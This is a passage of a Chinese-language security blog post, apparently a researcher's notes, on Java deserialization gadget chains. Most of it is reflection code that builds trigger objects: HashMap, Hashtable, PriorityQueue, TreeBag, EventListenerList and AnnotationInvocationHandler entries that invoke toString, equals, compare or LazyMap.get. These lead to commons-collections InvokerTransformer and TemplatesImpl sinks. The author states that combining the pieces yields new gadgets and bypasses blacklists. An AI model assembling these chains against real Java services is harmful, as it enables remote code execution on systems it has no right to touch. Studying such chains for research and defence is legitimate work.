都能触发到LazyMap.get。那我们只要找到调用到这个三个方法的头就行。</p><p>整理一下，目前我手里的 (还藏了几个)</p><p>由于在map里面put时，自动会计算hashcode，所以不罗列。</p><h3 id="BadAttributeValueExpException触发tostring"><a href="#BadAttributeValueExpException触发tostring" class="headerlink" title="BadAttributeValueExpException触发tostring"></a>BadAttributeValueExpException触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());<br>setFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br></code></pre></td></tr></table></figure><h3 id="HotSwappableTargetSource-XString-触发tostring"><a href="#HotSwappableTargetSource-XString-触发tostring" class="headerlink" title="HotSwappableTargetSource &amp; XString 触发tostring"></a>HotSwappableTargetSource &amp; XString 触发tostring</h3><p>com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)</p><p><img src="image-20240904164127446.png" alt="image-20240904164127446"></p><p><img src="image-20240904164153212.png" alt="image-20240904164153212"></p><p>注意满足强转类型,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">HotSwappabletostring</span><span class="hljs-params">(Object o1)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>    Object xstring;<br>    <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(o1);<br>  <span class="hljs-comment">//子类都行</span><br>    xstring = utils.createWithoutConstructor(<span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XStringForFSB&quot;</span>);<br>    utils.setFieldValue(xstring, <span class="hljs-string">&quot;m_obj&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>    xstring = utils.createWithoutConstructor(<span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XStringForChars&quot;</span>);<br>    utils.setFieldValue(xstring, <span class="hljs-string">&quot;m_obj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">5</span>]);<br>    xstring = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(xstring);<br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br></code></pre></td></tr></table></figure><p>本质是XString的equals的触发了obj的tostring。那么就用三个来触发了</p><h3 id="hashtable触发tostring"><a href="#hashtable触发tostring" class="headerlink" title="hashtable触发tostring"></a>hashtable触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTableTstring</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o,<span class="hljs-string">&quot;Unam4&quot;</span>);<br>    tHashMap2.put(o,<span class="hljs-string">&quot;SpringKill&quot;</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    hashtable.put(tHashMap1,<span class="hljs-string">&quot;Unam4&quot;</span>);<br>    hashtable.put(tHashMap2,<span class="hljs-string">&quot;SpringKill&quot;</span>);<br><br>    tHashMap1.put(o, <span class="hljs-literal">null</span>);<br>    tHashMap2.put(o, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="EventListenerList触发tostring"><a href="#EventListenerList触发tostring" class="headerlink" title="EventListenerList触发tostring"></a>EventListenerList触发tostring</h3><p>javax.swing.event.EventListenerList#readObject</p><p><img src="image-20240904173953522.png" alt="image-20240904173953522"></p><p><img src="image-20240904173528250.png" alt="image-20240904173528250"></p><p>读入对象，listenerTypeOrNull，然后调用add</p><p><img src="image-20240904174030792.png" alt="image-20240904174030792"></p><p>然后判断我们控制的类是不是属于name这个类，不属于直接可以字符串拼接，造成obj.tostring。l我们可以控制，来看序列化函数</p><p>javax.swing.event.EventListenerList#writeObject</p><p><img src="image-20240904174513832.png" alt="image-20240904174513832"></p><p>在序列化时，会对list里面对象进行强转，所以要找一个属于EventListener的类。</p><p><img src="image-20240904174943650.png" alt="image-20240904174943650"></p><p><img src="image-20240904175748816.png" alt="image-20240904175748816"></p><p>它有一个属性可控，类型Vector，Vector触发tostring，会对list每个对象都进行tostring，完成触发。</p><p><img src="image-20240904175754151.png" alt="image-20240904175754151"></p><p>javax.swing.undo.UndoManager#toString</p><p><img src="image-20240904180001650.png" alt="image-20240904180001650"></p><p>javax.swing.undo.CompoundEdit#toString</p><p><img src="image-20240904180012026.png" alt="image-20240904180012026"></p><p>java.util.Vector#toString</p><p><img src="image-20240904175819610.png" alt="image-20240904175819610"></p><p>java.util.AbstractCollection#toString</p><p><img src="image-20240904180522224.png" alt="image-20240904180522224"></p><p>然后遍历list对象，加入到sb,</p><p>java.lang.String#valueOf(java.lang.Object)</p><p><img src="image-20240904180646138.png" alt="image-20240904180646138"></p><p>直接进行tostring。</p><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.swing.event.EventListenerList.readObject<br>  javax.swing.event.EventListenerList.add<br>  java.lang.String#valueOf(UndoManager)<br>  javax.swing.undo.UndoManager#toString<br>  javax.swing.undo.CompoundEdit#toString<br>  java.util.Vector#toString<br>  java.util.AbstractCollection#toString<br>  java.lang.StringBuilder#append<br>  java.lang.String#valueOf<br>  expobj.toString<br></code></pre></td></tr></table></figure><p>还是值得学习一下的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br><span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br><span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) utils.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>vector.add(tiedMapEntry);<br>utils.setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Map.class, manager &#125;);<br></code></pre></td></tr></table></figure><h3 id="hashmap触发tostring"><a href="#hashmap触发tostring" class="headerlink" title="hashmap触发tostring"></a>hashmap触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmapToString</span><span class="hljs-params">(Object o1, Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o1,<span class="hljs-literal">null</span>);<br>    tHashMap2.put(o2,<span class="hljs-literal">null</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    utils.setFieldValue(hashMap, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>    Array.set(arr, <span class="hljs-number">0</span>, node1);<br>    Array.set(arr, <span class="hljs-number">1</span>, node2);<br>    utils.setFieldValue(hashMap, <span class="hljs-string">&quot;table&quot;</span>, arr);<br>    <span class="hljs-keyword">return</span> hashMap;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="HotSwappableTargetSource-触发equals"><a href="#HotSwappableTargetSource-触发equals" class="headerlink" title="HotSwappableTargetSource 触发equals"></a>HotSwappableTargetSource 触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(node);<br><span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-literal">null</span>));<br><span class="hljs-type">HashMap</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);<br></code></pre></td></tr></table></figure><p>说实话，脱裤子放屁</p><h3 id="Hashtable触发equals"><a href="#Hashtable触发equals" class="headerlink" title="Hashtable触发equals"></a>Hashtable触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTable</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    utils.setFieldValue(hashtable,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    nodeC = Class.forName(<span class="hljs-string">&quot;java.util.Hashtable$Entry&quot;</span>);<br><br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;Unam4&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;Springkill&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(hashtable, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="HashMap-触发equals"><a href="#HashMap-触发equals" class="headerlink" title="HashMap 触发equals"></a>HashMap 触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>    &#125;<br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ConcurrentHashMap触发equals"><a href="#ConcurrentHashMap触发equals" class="headerlink" title="ConcurrentHashMap触发equals"></a>ConcurrentHashMap触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConcurrentHashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeConcurrentMap</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>     ConcurrentHashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;sizeCtl&quot;</span>, <span class="hljs-number">2</span>);<br>     Class&lt;?&gt; nodeC;<br>     <span class="hljs-keyword">try</span> &#123;<br>         nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>     &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>         nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>     &#125;<br>     Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>     nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>     Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-literal">null</span>));<br>     Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-literal">null</span>));<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>     <span class="hljs-keyword">return</span> s;<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="AnnotationInvocationHandler触发tostring-（jdk"><a href="#AnnotationInvocationHandler触发tostring-（jdk" class="headerlink" title="AnnotationInvocationHandler触发tostring （jdk&lt;8u20）"></a>AnnotationInvocationHandler触发tostring （jdk&lt;8u20）</h3><p>sun.reflect.annotation.AnnotationInvocationHandler#readObject</p><p><img src="image-20240823141751373.png" alt="image-20240823141751373"></p><p>可以这个vaule直接和字符拼接，会触发value.tostring。value是memberValues 这个map里的vaule，可控。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map1.put(<span class="hljs-string">&quot;value&quot;</span>,tiedMapEntry);<br>Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; Anotationdeclared = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Target.class, map1);<br></code></pre></td></tr></table></figure><h3 id="Flat3Map触发hashcode"><a href="#Flat3Map触发hashcode" class="headerlink" title="Flat3Map触发hashcode"></a>Flat3Map触发hashcode</h3><p>org.apache.commons.collections.map.Flat3Map#readObject</p><p><img src="image-20240823142441405.png" alt="image-20240823142441405"></p><p><img src="image-20240823145130393.png" alt="image-20240823145130393"></p><p><img src="image-20240823145138574.png" alt="image-20240823145138574"></p><p>可以看到和hashmap一样，所有都能用。</p><p>最后将上面source，flow，sink 一一组合就可以得到一些新gadget。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//避免put是触发</span><br>Map s= (Map) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flat3Map</span>();<br>    Class&lt;?&gt; nodeB;<br>    nodeB = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.AbstractHashedMap$HashEntry&quot;</span>);<br>    <span class="hljs-type">HashedMap</span> <span class="hljs-variable">hashedMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>    Constructor&lt;?&gt; nodeCons = nodeB.getDeclaredConstructor(nodeB,<span class="hljs-type">int</span>.class, Object.class, Object.class);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeB, <span class="hljs-number">1</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-literal">null</span>,<span class="hljs-number">0</span>, tiedMapEntry, tiedMapEntry));<br>    utils.setFieldValue(hashedMap, <span class="hljs-string">&quot;data&quot;</span>, tbl);<br>    utils.setFieldValue(hashedMap, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">1</span>);<br>    utils.setFieldValue(s,<span class="hljs-string">&quot;delegateMap&quot;</span>,hashedMap);<br></code></pre></td></tr></table></figure><h3 id="AnnotationInvocationHandle触发map-get"><a href="#AnnotationInvocationHandle触发map-get" class="headerlink" title="AnnotationInvocationHandle触发map.get"></a>AnnotationInvocationHandle触发map.get</h3><p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p><p><img src="image-20240823171628559.png" alt="image-20240823171628559"></p><p>memberValues可控，map类型. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; Anotationdeclared =<br>        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, lazymap/DefaultedMap);<br><span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span>Anotationdeclared.newInstance(Override.class, Mapproxy);<br></code></pre></td></tr></table></figure><h2 id="0x02-commons-collections-TransformingComparator-compare"><a href="#0x02-commons-collections-TransformingComparator-compare" class="headerlink" title="0x02 commons.collections (TransformingComparator.compare)"></a>0x02 commons.collections (TransformingComparator.compare)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformingComparator.compare()<br>    ChainedTransformer.transform()<br>            InvokerTransformer.transform()<br>                InstantiateTransformer.transform()<br>                    TemplatesImpl.newTransformer()   <br></code></pre></td></tr></table></figure><p>org.apache.commons.collections.comparators.TransformingComparator#compare</p><p><img src="image-20240823152533206.png" alt="image-20240823152533206"></p><p>transform这个属性可控。所以需要调用compare</p><p>目前本人收集的</p><h3 id="PriorityQueue触发compare"><a href="#PriorityQueue触发compare" class="headerlink" title="PriorityQueue触发compare"></a>PriorityQueue触发compare</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>);<br>utils.setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>utils.setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, Tcomparator);<br>utils.setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class,<span class="hljs-number">1</span>&#125;);<br><br></code></pre></td></tr></table></figure><h3 id="TreeBag触发compare"><a href="#TreeBag触发compare" class="headerlink" title="TreeBag触发compare"></a>TreeBag触发compare</h3><p>org.apache.commons.collections.bag.TreeBag#readObject</p><p><img src="image-20240823153834885.png" alt="image-20240823153834885"></p><p><img src="image-20240823153847089.png" alt="image-20240823153847089"></p><p>这里map改为TreeMap类型</p><p>java.util.TreeMap#put</p><p><img src="image-20240823153927816.png" alt="image-20240823153927816"></p><p>java.util.TreeMap#compare</p><p><img src="image-20240823153936586.png" alt="image-20240823153936586"></p><p>compare属性可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        TransformingComparator comparator  = new TransformingComparator(chain);</span><br>        <span class="hljs-type">TreeBag</span> <span class="hljs-variable">treeBag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeBag</span>(comparator);<br>        treeBag.add(Runtime.class);<br></code></pre></td></tr></table></figure><p>以上任意组合，就可以得到新gadget。这个点也可以走到cb的gadget（一般cc、cb都有的情况.绕黑名单）。</p><h3 id="hashmap触发compare"><a href="#hashmap触发compare" class="headerlink" title="hashmap触发compare"></a>hashmap触发compare</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fallback">java.util.AbstractMap#equals<br></code></pre></td></tr></table></figure><p>具体可以操作这个类，具体流程可以看看我这篇文章</p><p><a href="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/">https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/</a></p><p><img src="image-20240905111934832.png" alt="image-20240905111934832"></p><p>java.util.TreeMap#get</p><p><img src="image-20240905130109523.png" alt="image-20240905130109523"></p><p><img src="image-20240905130116993.png" alt="image-20240905130116993"></p><p><img src="image-20240905130147076.png" 